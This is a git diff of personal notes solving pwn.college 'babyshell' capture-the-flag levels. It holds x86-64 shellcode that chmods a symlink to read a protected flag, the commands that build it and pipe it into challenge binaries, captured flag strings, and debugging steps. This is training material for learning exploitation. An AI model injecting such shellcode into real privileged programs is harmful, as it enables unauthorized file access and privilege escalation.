@@ -305,9 +305,7 @@ cat solve.bin | /challenge/babyshell_level3
 pwn.college{8vDVbOV8ZUKqYqz6PXzS0HrV3IS.QX5EjMscTOxUzW}
 
 # 4 no h bytes -> 48 close just need file reading
-# s file
-
-  GNU nano 4.8                                                                       shell4.s                                                                                 
+# s file -> almost done solution
 .global _start
 .intel_syntax noprefix
 _start:
@@ -339,19 +337,32 @@ _start:
     mov edi, 42
     syscall
 
+# 4 -> actual solution
+# s file
+global _start
+.intel_syntax noprefix
+_start:
 
-gcc -nostdlib -o solve.elf shell4_2.s
+    # load path Z to register
+        #xor rcx, rcx
+        mov ecx, 0x5A       # symlink to Z cl -> rcx
+        push rcx
+        push rsp            # RSP stack pointer
+        pop rdi
+
+        mov sil, 0x7          # set perm to 4
+        mov al, 90          # chmod syscall
+        syscall
+
+
+
+gcc -nostdlib -o solve.elf schmod2.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level4
+pwn.college{IbsuuBQcoJEqyJ_QDc5c47Aorl0.QXwIjMscTOxUzW}
 
-strace ./solve.elf
-gdb ./solve.elf
-    starti
-    info proc map
-    disp/5i $rip
-    si
 
 # 5
 .global _start
@@ -527,11 +538,6 @@ pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}
 
 
 
-gcc -nostdlib -o solve.elf shell12.s
-./solve.elf
-objdump -M intel -d solve.elf
-objcopy --dump-section .text=solve.bin solve.elf
-cat solve.bin | /challenge/babyshell_level*
 
 
 # 10
@@ -551,7 +557,7 @@ _start:
     	mov al, 90         # chmod syscall
 	syscall
 
-gcc -nostdlib -o solve.elf shell.s
+gcc -nostdlib -o solve.elf shellchmod3.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
@@ -999,3 +1005,11 @@ mov al, 59
 cdq  # reset rdx within a single byte!
 
 syscall
+
+
+strace ./solve.elf
+gdb ./solve.elf
+    starti
+    info proc map
+    disp/5i $rip
+    si
